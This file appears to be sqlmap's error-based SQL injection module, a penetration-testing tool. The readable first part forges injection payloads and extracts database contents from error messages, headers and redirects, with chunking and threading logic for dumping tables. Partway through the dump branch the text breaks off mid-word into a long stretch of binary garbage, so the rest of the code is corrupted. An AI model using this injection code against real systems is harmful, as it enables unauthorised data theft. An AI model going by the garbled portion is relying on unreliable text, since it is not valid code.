#!/usr/bin/env python2

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import extractRegexResult
from lib.core.common import firstNotNone
from lib.core.common import getConsoleWidth
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.common import wasLastResponseHTTPError
from lib.core.compat import xrange
from lib.core.convert import decodeHex
from lib.core.convert import getUnicode
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import HTTP_HEADER
from lib.core.exception import SqlmapDataException
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
from lib.core.settings import MAX_ERROR_CHUNK_LENGTH
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import ROTATING_CHARS
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from thirdparty import six

def _oneShotErrorUse(expression, field=None, chunkTest=False):
    offset = 1
    rotator = 0
    partialValue = None
    threadData = getCurrentThreadData()
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal and PARTIAL_VALUE_MARKER in retVal:
        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")
        logger.info("resuming partial value: '%s'" % _formatPartialContent(partialValue))
        offset += len(partialValue)

    threadData.resumed = retVal is not None and not partialValue

    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
        debugMsg = "searching for error chunk length..."
        logger.debug(debugMsg)

        current = MAX_ERROR_CHUNK_LENGTH
        while current >= MIN_ERROR_CHUNK_LENGTH:
            testChar = str(current % 10)

            testQuery = "%s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
            testQuery = "SELECT %s" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)

            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))

            if (result or "").startswith(testChar):
                if result == testChar * current:
                    kb.errorChunkLength = current
                    break
                else:
                    result = re.search(r"\A\w+", result).group(0)
                    candidate = len(result) - len(kb.chars.stop)
                    current = candidate if candidate != current else current - 1
            else:
                current = current // 2

        if kb.errorChunkLength:
            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)
        else:
            kb.errorChunkLength = 0

    if retVal is None or partialValue:
        try:
            while True:
                check = r"(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                trimCheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start

                if field:
                    nulledCastedField = agent.nullAndCastField(field)

                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
                        extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                        if extendedField != field:  # e.g. MIN(surname)
                            nulledCastedField = extendedField.replace(field, nulledCastedField)
                            field = extendedField
                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)

                # Forge the error-based SQL injection request
                vector = kb.injection.data[kb.technique].vector
                query = agent.prefixQuery(vector)
                query = agent.suffixQuery(query)
                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                injExpression = unescaper.escape(injExpression)
                injExpression = query.replace("[QUERY]", injExpression)
                payload = agent.payload(newValue=injExpression)

                # Perform the request
                page, headers, _ = Request.queryPage(payload, content=True, raise404=False)

                incrementCounter(kb.technique)

                if page and conf.noEscape:
                    page = re.sub(r"('|\%%27)%s('|\%%27).*?('|\%%27)%s('|\%%27)" % (kb.chars.start, kb.chars.stop), "", page)

                # Parse the returned page to get the exact error-based
                # SQL injection output
                output = firstNotNone(
                    extractRegexResult(check, page),
                    extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                    extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                    extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                )

                if output is not None:
                    output = getUnicode(output)
                else:
                    trimmed = firstNotNone(
                        extractRegexResult(trimCheck, page),
                        extractRegexResult(trimCheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                        extractRegexResult(trimCheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                        extractRegexResult(trimCheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                    )

                    if trimmed:
                        if not chunkTest:
                            warnMsg = "possible server trimmed output detected "
                            warnMsg += "(due to its length and/or content): "
                            warnMsg += safecharencode(trimmed)
                            logger.warn(warnMsg)

                        if not kb.testMode:
                            check = r"(?P<result>[^<>\n]*?)%s" % kb.chars.stop[:2]
                            output = extractRegexResult(check, trimmed, re.IGNORECASE)

                            if not output:
                                check = r"(?P<result>[^\s<>'\"]+)"
                                output = extractRegexResult(check, trimmed, re.IGNORECASE)
                            else:
                                output = output.rstrip()

                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
                    if offset == 1:
                        retVal = output
                    else:
                        retVal += output if output else ''

                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:
                        offset += kb.errorChunkLength
                    else:
                        break

                    if output and conf.verbose in (1, 2) and not conf.api:
                        if kb.fileReadMode:
                            dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                        elif offset > 1:
                            rotator += 1

                            if rotator >= len(ROTATING_CHARS):
                                rotator = 0

                            dataToStdout("\r%s\r" % ROTATING_CHARS[rotator])
                else:
                    retVal = output
                    break
        except:
            if retVal is not None:
                hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
            raise

        retVal = decodeDbmsHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, six.string_types):
            retVal = htmlunescape(retVal).replace("<br>", "\n")

        retVal = _errorReplaceChars(retVal)

        if retVal is not None:
            hashDBWrite(expression, retVal)

    else:
        _ = "(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):
    values = []
    origExpr = None

    width = getConsoleWidth()
    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if not suppressOutput:
            if kb.fileReadMode and output and output.strip():
                print()
            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                status = "[%s] [INFO] %s: '%s'" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))

                if len(status) > width:
                    status = "%s..." % status[:width - 3]

                dataToStdout("%s\n" % status)

        if isinstance(num, int):
            expression = origExpr

        values.append(output)

    return values

def _errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@").replace(kb.chars.hash_, "#")

    return retVal

def _formatPartialContent(value):
    """
    Prepares (possibly hex-encoded) partial content for safe console output
    """

    if value and isinstance(value, six.string_types):
        try:
            value = decodeHex(value, binary=False)
        except:
            pass
        finally:
            value = safecharencode(value)

    return value

def errorUse(expression, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(kb.technique)

    abortedFlag = False
    count = None
    emptyFields = []
    start = time.time()
    startLimit = 0
    stopLimit = None
    value = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # Set kb.partRun in case the engine is called from the API
    kb.partRun = getPartRun(alias=False) if conf.api else None

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "used SQL query returns "
                    infoMsg += "%d %s" % (stopLimit, "entries" if stopLimit > 1 else "entry")
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if isNumPosStrValue(count) and int(count) > 1:
                if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                    message = "due to huge table size do you want to remove "
                    message += "ORDER BY clause gaining speed over consistency? [y/N] "

                    if readInput(message, default="N", boolean=True):
                        expression = expression[:expression.index(" ORDER BY ")]

                numThreads = min(conf.threads, (stopLimit - startLimit))

                threadData = getCurrentThreadData()

                try:
                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))
                except OverflowError:
                    errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
                    errMsg += "with switch '--fresh-queries'"
                    raise SqlmapDataException(errMsg)

                threadData.shared.va��$�qm>�l���>�{�*C��B�7���Yz���.�p���)"�y��[]�ѵ��)a��݁��&*侶?*ej����Ah"0�g����>zY�7�nQ�� �e�]��Du-��^)fO�]xK&{�<o)����h@�A���E�m��{@J�.���D�A�]���w��1��ʆ���4�6s3�(�{�[0�:5�������#D��č:����\%}�+|��/ ^����W�h��&���pU��&p�h���\"W+����(u PZ��d�0��2�iٔ[B˦:@��eS���ي��+��lh8�"<�Vs�\�<�|�Y3
�v�u�v%��]"��q��4�i�RS����1Q��P$��k��< a_  d\yg�tnr�|��Ki�\|�4y�E 9�81������M�&�p�q������.U���^��2��+),���8��T�&
Y�K�2]�vfҒ损X�%ޝ���>��dx,�^���B4]�b��Q��ӭf}��>�.�ꇁ8���Z1QD�)ֈ�F�|*��)�Ui>C��E��ұ׾��s����?K�]�7{�ф^E��պQaO�{P�Jo
�T2�ñ��Q"L/��6�fM�� �8���a9��f#?�Nt��<#�������r��G�`} ��$mXc,U�3�Z��\���i���Y��Qè�3�pa��0��@��W @ǘ�7h��¾�A�A-HTQ��'Tq,@U4h��ė\�M"��ڗ�¾ �dr�5 3Ӗ[?�\�� -�m��I*��)�T,�Åo�a��Zl�U	��t#ylE� 5����&#2�b��d�4��:Ĩ"�S���ߌ懧m�1ꣃ�����A#��r(C���μ�V���}����wўe��Ӱo�QA�Ƿ(� K��-�kuwI��+0���y�偏�Ŵ#	��>g�K��/ @Ut�r'��2�Hy�A����K ��Q�%��<.=٦�C����9���q�d�9(A��qW�۴�wh�ꆠ��(����[v���`��23����\�@���s��+�Q��j!�Ҋ�>v�E��P�^30
l���6Ӕ��uC�2M)���d��Sp��T�8>A�UɅ`v� ���7�D��@��`��fQ����XA2ߧT����ͷ��(���o�|�O�W�|Y�׌|�:��o�{��Pj�D�N&�C����hē���M�ȍH.���ο��:2����֫Nd?����7��y8u��'�����-��o_���M},_�l.�O�J��>ӄtJh��':u�����?+4~w�!�x��U�[͢\L�I{���5yb9���q��<j*s7&s@vm��=.����d�ڿ1%����%x��O���N
�C���b��.��	������վ,����T��j�2���K���.���o֢�� �� 
Z��.���0���]�l�|���Mn�9�Uf )��?�n�����>U�Q����K2�
�e7��������_� �=�g��<�bRD<6��D�&V�ߋbm*|��n,6_:>[�bΖ�U��T	���r��W�R����?V�?S~9o�bR��d��+�(�)pEܒ���*�Ս�rc��2���{�*k��U��T��W���T�]n���?���`�|ń�%������X�݈Z�_��*��n9o�
�)#&�*b"���|��҉rw���ƚ)���]|���X+K�Q�{�������q����Y:q�[�J,����O���qsʽ��2 >�t\s4E:��̫�h�Y��ˎ���Y�sozZ1F������&�	����6��s��QH]��Rͽ��L|��M�]��A[Y�6q'� ێ�A�=.�]m�J��˫z�3���K[����Z�)�!͖�>����e��s�z����:��Υ��I�� +�F�B/�K#"Eƥ,wT`;�)��2����,��c7�������b�T�O
q�C�{�H��a�A3�%EL���+ܵ�뇌}:�����)�?_`�d��V��/'���������O�O����є�@�o�k���_��A�[�L.��F*�+�'8h !���L����6�<��|���]�F�y�T�q�ܳ���b =�BX����cD۷B;b��Zkw�Ζ+/�KT�8�4M@���)Ul1�RW�)۹0!ő�\���8GL&+ T
��&�7�P�%�<C��`૜�i�{|���w���l��eKi�a�k�/0������K�KH@'�r�AY���R�<OC^�$�[��D���_��@�<)M��w
9��Z��\�ln���x��du,�,e��Rk��$�-C���-�pJHMl���k�	�ΞR�C!�Ոw�A�b��&��:��:�"��B�i3�\S�2G�X��1�ؕ�.u4*@S���+C�&�b7�Z�n�YD�r�*�\b7�Aj�؂44��I����>���m��ʍ��DDn�B%>U!�����i 
��)��}�֠+m<���G^<(��z��8^`�ғ�O)��S}Df��$4�$�@@�
�����L���AQ���D�N]*�pK�#�F� �-@�M^
����@�h?�ʮ�"o�`E���;>�՘�@Y�_5&�3�1{�̤�3`�N����+��PdP�L�5c�'5!�K!l�4�|E뚝��5�dBݳnᚮ���v+�����pގ3��O0�~d���#�r�����}�G~�tӖך��/����;��3����e}���R�X6�)�e����n�����7��MڋuD8d�r�ϖ--!��w�ۿ��Dħ"�,[�Gˤ,I���>EP��P:I�HTc�c���0.�C���!��'��M����˴CRT�ݓ! ��"�g=v8�`P��l7���V�sв��A��e���$G�\�ٸX��r1h�)�"߆z�������ľN#��.!J����51C4D�ؾ�B�&#���C�U�J���	�2I07�i����튰~G���L3������d�Ci�����ZC����s���\�!�p��R��v�^�v;�ALd���R�7�pa�'{�$K@HѦKi�3��|�j��nHP��87MIS��9%��y脐G���:O�!a2�����c�����rfi4��Ü�j��]�>��㹼� *�!�1DY�1��P��y��a��ѡLT�	��DtO+�Xb�PZ_~�C����ř��'寐6)C�tNL���%��ϒ����LIV�?���*��uc~�Ɇ���i��rX��� �em���}�zl��wr�Xn��ȡR�S�@2ʐ�}]*{&�ϠII�]^��Bp5[��k�
�2%��h���H?�-�CA��DG���[�6�7cGj�)�f���r���n�U(z�&:Řf,��Y�78�\�T�wSu"���>�Fͨ����'`n�[n�&pd��*_�/�	ZյS"���'��U7E�����K��	�n%�'�Up�
���1 !�%� .�mC��j�V^�����OR-�̓��M���절Jq�-f(�t���QG�D�AJ�Р	�o�A�A@��\��x_dՐ�KuO�?E�u|�Y�+�: �q_J�@z��m�P��?0j�ol�י���Е�ݮ4O��0Ȥ"�uE8)��Q�-Z%��,B{eԇ�D����������f�N�Ǌ��D{}�N�O{͞�.;~�ۖu�^@彀`��0�%AX��n0�:��I�3�~��O��,��,�17�Mg��)���4���<:&�c���,�y�����L�Lנ/R��b(�W�s��h`�@�=.�b���N����Ix�i����D��+n���~��7��̖7���~��&�!/�J�[��q�t��,9^/��L�a�iq��>�#�����&/5��h�?.%�A���(�	��X��YR�cʸվb��[�`>�����Ф�O�����_t��'��ΜT�_����1C��R@����JZ�;܊���g�ѝ��q��E�`.f�DǪq-�\�rŽ�uƘ"�&u#��Koج9hK�|Q�d;�뒆&�+�i���������S78?yh��U����7� w�
��npVrٱ���P���~c���p���ck���I�gO�Z�;ļ��QBj�M���q��